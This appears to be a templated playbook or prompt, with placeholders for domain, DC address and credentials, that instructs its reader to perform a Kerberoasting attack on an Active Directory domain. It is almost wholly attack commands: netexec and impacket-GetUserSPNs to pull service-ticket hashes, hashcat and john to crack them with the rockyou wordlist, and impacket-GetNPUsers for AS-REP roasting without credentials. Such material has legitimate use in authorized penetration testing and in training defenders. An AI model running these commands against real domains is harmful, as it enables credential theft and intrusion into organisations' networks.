name: Kerberoasting
content:
Perform a Kerberoasting attack on {domain}.

**1. Identify accounts with SPNs :**
```bash
netexec ldap {dc_ip} -u {username} -p '{password}' --kerberoasting output.txt
```

**2. Impacket GetUserSPNs :**
```bash
impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile hashes.txt
```

**3. Crack the hashes :**
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Without credentials (AS-REP Roasting) :**
```bash
impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -usersfile users.txt -format hashcat
```

Service accounts often have weak or reused passwords.
